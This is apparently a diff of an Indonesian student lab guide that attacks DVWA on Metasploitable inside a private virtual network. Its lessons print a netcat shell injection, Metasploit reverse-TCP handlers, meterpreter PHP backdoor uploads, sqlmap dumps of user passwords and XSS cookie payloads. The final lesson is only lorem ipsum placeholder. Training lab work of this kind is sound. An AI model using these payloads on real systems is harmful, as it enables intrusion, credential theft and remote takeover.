@@ -24,43 +24,43 @@ Ket = perintah di atas akan memberi ip address dalam rentang 10.0.1.100 sampai 1
 2. Setting Network Virtual OS Metsploitable
 Klik Kanan Virtual OS -> Setting -> Buka Tab Network -> isi Attached Netwrok : Internal Network dan Name : intnet(nama dhcp server Langkah 1)
 
-Gambar 1
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/1.PNG)
 
 Jika Berhasil , maka akan didapatkan ip dalam rentang 10.0.1.100 sampai 10.0.1.200 :
 
-Gambar 2
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/2.PNG)
 
 3. Lakukan Hal tersebut pada Virtual OS backtrack dan viertual OS ubuntu
 4. Setting security DVWA menjadi Low
 Buka ip Virtual OS metasploitable pada browser di virtual OS Ubuntu. contoh = 10.0.1.100/dvwa
 
-Gambar 3
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/3.PNG)
 
 Login dengan username : admin , password : password
 
-Gambar 4
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/4.PNG)
 
 Klik Tab DVWA Security, Pilih Low, SUBMIT
 
-Gambar 5
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/5.PNG)
 ## Testing
 ### Lesson 4: Using Metasploit with Command Execution
 
 1. Jalankan Netcat pada Metasploit
 Klik tab Command Execution
 
-GAMbar 6
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/6.PNG)
 
 Jalankan perintah
 ```
 http://10.0.1.100;mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe
 ```
 Ket = 10.0.1.100 -> ip Metasploitable
-GAMbar 7
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/7.PNG)
 
 2. Start VIrtual OS backtrack, login dengan username : root, password: toor
 3. Buka start Menu ->BackTrack->Exploitation Tools->Network Exploitation tool->Metasploit Framework -> msf console
-Gambar 8
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/8.PNG)
 
 4. Jalankan perintah-perintah berikut secara bergantian
 ```
@@ -78,20 +78,20 @@ exploit
 ### Lesson 5: Using Tamper Data with crack_web_form.pl
 
 1. Enable add on Tamper Data pada firefox di Backtrack
-GAmbar 9
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/9.PNG)
 
 2. Buka Halaman DVWA dengan firefox di Backtrack
 3. Start Add on Tamper Data (Firefox->Tools->Tamper Data -> STart Tamper)
 
-Gambar 10
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/10.PNG)
 4. Login dengan akun username : admin dan password : password pada halaman DVWA
 5. AKan muncul notifikasi Sumbit tamper data. Uncheck textbox dan klik submit
 
-Gambar 11
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/11.PNG)
 
 6. Copy data POSTDATA dalam REQUEST HEADER padasalah satu data yang method-nya POST
 
-Gambar 12
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/12.PNG)
 
 7. copy data tersebut pada notepad
 8. Login sekali lagi dengan username dan password yang salah
@@ -111,11 +111,11 @@ Gambar 12
 ```
 Ket: 10.0.1.100->IP metasploitable
 
-Gambar 13
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/13.PNG)
 ### Lesson 6: Manual SQL Injection, John the Ripper
 
 1. Login KE DVWA. Buka menu SQL Injection
-Gambar 14
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/14.PNG)
 2. Skenario Basic Injection
 Masukkan perintah berikut di kolom SQL Injection
 ```
@@ -164,7 +164,7 @@ Masukkan perintah berikut di kolom SQL Injection
 11. Membuat password hash file
 Data yang didapatkan dari langkah ke-10 simpan di notepad taruh di folder /pentest/password/john dengan format seperti gambar di bawah
 
-Gambar 15
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/15.PNG)
 
 Jalankan perintah berikut untuk mencrypt password yg terenkripsi
 ```
@@ -179,9 +179,9 @@ cd /pentest/passwords/john
 1. Login ke DVWA dan buka menu SQL INjection
 2. Start add On tamper data
 3. MAsukkan angka 1 di kolom sql injection, maka akan muncul notifikasi submit. uncheck checkbox
-Gambar16
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/16.PNG)
 4. Catat data REferrer dan data Cookiedari salah satu paket GET
-GAMBAR 17
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/17.PNG)
 5. Buka folder SQLMAP pada terminal dengan mengetik
 ```
 cd /pentest/web/scanners/sqlmap
@@ -194,7 +194,7 @@ Ket : sesuaikan data dengan langkah ke 4
 
 jika ada pemrtanyaan, pilih yes. Setelah proses selesai, hasilnya kan sepertin ini :
 
-Gambar 18
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/18.PNG)
 
 Data tersebut merupakan database yang sedang digunakan
 
@@ -208,7 +208,7 @@ Ket : sesuaikan data dengan langkah ke 4
 
 Jika berhasil maka akan seperti gambar di bawah ini :
 
-Gambar 19
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/19.PNG)
 
 9. MEnggunakan sqlmap untuk dapatkan isi username dan password database DVWA
 ```
@@ -216,19 +216,19 @@ Gambar 19
 ```
 Ket : sesuaikan data dengan langkah ke 4
 
-Gambar 20
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/20.PNG)
 Jalankan perintah :
 ```
 ./sqlmap.py -u "http://10.0.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" -D dvwa -T users --columns
 ```
 Ket : sesuaikan data dengan langkah ke 4
-Gambar 21
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/21.PNG)
 Jalankan perintah :
 ```
 ./sqlmap.py -u "http://10.0.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" -D dvwa -T users -C user,password --dump
 ```
 Ket : sesuaikan data dengan langkah ke 4
-Gambar 22
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/22.PNG)
 ### Lesson 8: Upload PHP Backdoor Payload
 
 1. Jalankan perintah :
@@ -252,14 +252,14 @@ set LHOST 10.0.1.102
 set LPORT 4444
 exploit
 ```
-Gambar 23
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/23.PNG)
 
 5. Login ke DVWA, Masuk ke menu Upload. dan upload PHONE_HOME.php. Jika berhasil akan seperti gambar :
-Gambar 24
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/24.PNG)
 
 6. Buka http://10.0.1.100/dvwa/hackable/uploads/ dan klik PHONE_HOME.php. Jika berhasil akan seperti gambar
 
-Gambar 25
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/25.PNG)
 
 7. Jalankan perintah :
 ```
@@ -271,10 +271,10 @@ Gambar 25
     echo "Hacked By PKSJ" > hacked.html
     ls -l
 ```
-Gambar 26
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/26.PNG)
 8. Jika berhasil maka file hacked.html sudah ada di DVWA
 
-Gambar 27
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/27.PNG)
 ### Lesson 9: Cross Site Scripting (XSS)
 
 1. Ubah limit script guna melancarkan aksi
@@ -297,7 +297,7 @@ Login ke DVWA buka menu XSS STORED. ISi seperti di bawah ini :
     Message: <iframe src="http://www.cnn.com"></iframe>
     Click Sign Guestbook
 ```
-GAmbar 28
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/28.PNG)
 
 4. SKenario expolit COOKIE di XSS STORED
 Login ke DVWA buka menu XSS STORED. ISi seperti di bawah ini :
@@ -306,7 +306,7 @@ Login ke DVWA buka menu XSS STORED. ISi seperti di bawah ini :
     Message: <script>alert(document.cookie)</script>
     Click Sign Guestbook
 ```
-GAmbar 29
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/29.PNG)
 5. SKenario expolit windows.location di XSS STORED
 Ketikkan perintah berikut
 ```
@@ -316,7 +316,7 @@ msfpayload php/meterpreter/reverse_tcp LHOST=10.0.100.102 LPORT=4444 R > FORUM_B
 ```
 Hilangkan tanda # di file FORUM_BUG.php
 Login ke DVWA buka menu upload, upload file FORUM_BUG.php
-Gambar 30
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/30.PNG)
 Buka msfconsole dan ketikkan perintah berikut
 ```
 use exploit/multi/handler
@@ -336,7 +336,7 @@ buka menu XSS STORED. ISi seperti di bawah ini :
     Click Sign Guestbook
 ```
 Jika berhasil , maka di msf console akan berubah jadi gambar berikut :
-Gambar 31
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/31.PNG)
 ### Lesson 10: Cross Site Request Forgery combined with Curl
 
 "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
